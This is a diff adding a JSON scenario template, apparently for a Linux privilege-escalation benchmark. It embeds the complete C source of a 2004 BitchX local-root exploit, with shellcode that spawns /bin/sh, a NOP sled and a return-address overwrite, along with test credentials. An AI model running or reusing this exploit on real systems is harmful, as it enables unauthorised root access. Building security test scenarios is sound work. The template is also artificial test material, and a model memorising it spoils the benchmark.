@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_586",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: BitchX 1.0c19 - Local Privilege Escalation (OSVDB-11104)\n\nExploit source code (586.c):\n```\n// BitchX local-root by Sha0 (version 1.0c19 e inferiores -todas-)\n// este exploit se lo dedico a mi chica.\n// 0xC0000000-4-strlen(argv[1])-1-strlen(buffer)\n// 2052 to the ret\n\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nchar payload[69];\nchar sha0code[] =\n \"\\xeb\\x16\\x5b\\x31\\xc0\"\n \"\\x50\\x53\\xb0\\x0b\\x89\"\n \"\\xdb\\x89\\xe1\\x31\\xd2\"\n \"\\xcd\\x80\\x31\\xc0\\x40\"\n \"\\x31\\xdb\\xcd\\x80\\xe8\"\n \"\\xe5\\xff\\xff\\xff\\x2f\"\n \"\\x62\\x69\\x6e\\x2f\\x73\\x68\";\n\n\nvoid nopea (void);\n\nint main (int argc, char **argv) {\n\n char *buff;\n char *arg1=\"bash\";\n char *arg2=\"-c\";\n char *arg[]={arg1,arg2,buff,NULL};\n char *env[]={\"TERM=xterm\",payload,NULL};\n char offset[]=\"\";\n char sret[4];\n unsigned long lret;\n int i;\n\n if (argc != 2) {\n  fprintf (stdout,\"BitchX exploit Coded By Sha0\\n\");\n  fprintf (stdout,\"ej: %s /usr/bin/BitchX\\n\\n\",argv[0]);\n  return (1);\n }\n\n buff = (char *)malloc (2100);\n bzero (buff,sizeof(buff));\n arg[2] = buff;\n\n nopea ();\n\n lret = 0xbffffffa - strlen(payload) - strlen(argv[1]);\n sret[0] = (0x000000ff & lret);\n sret[1] = (0x0000ff00 & lret) >> 8;\n sret[2] = (0x00ff0000 & lret) >> 16;\n sret[3] = (0xff000000 & lret) >> 24;\n\n for (i=0;i<2088;i+=4) // 2088 tirando largo.\n  memcpy (buff+i,sret,4);\n\n execve (argv[1],arg,env);\n perror (\"execve()\");\n\n free (buff);\n return (0);\n}\n\n\nvoid nopea (void) {\n        bzero (payload,sizeof(payload));\n        memset (payload,0x90,sizeof(payload)-1);\n        memcpy (payload+sizeof(payload)-strlen(sha0code)-1,sha0code,strlen(sha0code));\n}\n\n// milw0rm.com [2004-10-20]\n```",
+  "cve": "OSVDB-11104",
+  "exploitdb_id": "586",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_586",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
